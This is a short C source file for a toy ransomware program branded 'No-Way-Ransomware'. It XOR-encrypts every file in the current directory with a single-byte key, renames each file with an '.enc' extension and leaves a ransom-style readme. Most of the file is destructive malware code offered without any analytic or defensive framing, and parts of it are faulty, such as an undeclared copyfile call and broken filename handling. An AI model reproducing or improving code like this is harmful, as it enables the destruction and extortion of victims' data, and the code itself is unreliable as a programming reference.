#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define DESTINATION_DIR "./test/"
#define ENCRYPTED_FILE_NAME ".enc"
#define CONF_FILE_NAME "readme_encrypted_files.txt"

void EncryptFile(char* filename) {
    FILE* fp = fopen(filename, "r+b");

    if (fp == NULL)
        return;
    fseek(fp, 0, SEEK_END);
    int size = ftell(fp);
    char* content = (char*)malloc(sizeof(char) * size);
    rewind(fp);

    int result = fread(content, 1, size, fp);
    if (result != size) {
        printf("Error reading the file\n");
        return;
    }
    for (int i = 0; i < size; i++)
        content[i] = content[i] ^ 0x45;
    rewind(fp);
    fwrite(content, 1, size, fp);
    fclose(fp);
}

int main(int argc, char* argv[]) {
    char filePath[FILENAME_MAX];
    getcwd(filePath, FILENAME_MAX);

    DIR* dir;
    struct dirent* ent;
    if ((dir = opendir(filePath)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            char fileFullPath[FILENAME_MAX];
            sprintf(fileFullPath, "%s/%s", filePath, ent->d_name);
            if (ent->d_type == DT_DIR) {
                // ignore directories
            } else {
                printf("Encrypting %s :\n", ent->d_name);
                EncryptFile(fileFullPath);
                char newFileName[FILENAME_MAX];
                int len = strlen(ent->d_name);
                memcpy(newFileName, ent->d_name, len - 3);
                memcpy(newFileName + len - 3, ENCRYPTED_FILE_NAME, 5);
                char newFileFullPath[FILENAME_MAX];
                sprintf(newFileFullPath, "%s/%s", filePath, newFileName);
                int result = rename(fileFullPath, newFileFullPath);
                if (result == 0) {
                    printf("[!] Encrypted\n");
                } else {
                    printf("Error encrypting the file.\n");
                }
            }
        }
        closedir(dir);
        char confPath[FILENAME_MAX];
        sprintf(confPath, "%s/%s", filePath, CONF_FILE_NAME);

        FILE* fptr = fopen(confPath, "w");
        if (fptr == NULL) {
            printf("Error creating readme file\n");
            return -1;
        }
        char message[] = "All your files has b33n 3ncrypt3d by No-Way-Ransomware.\n";
        fprintf(fptr, "%s", message);
        fclose(fptr);
        copyfile(confPath, DESTINATION_DIR, 0);

    } else {
        /* could not open directory */
        perror("");
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}
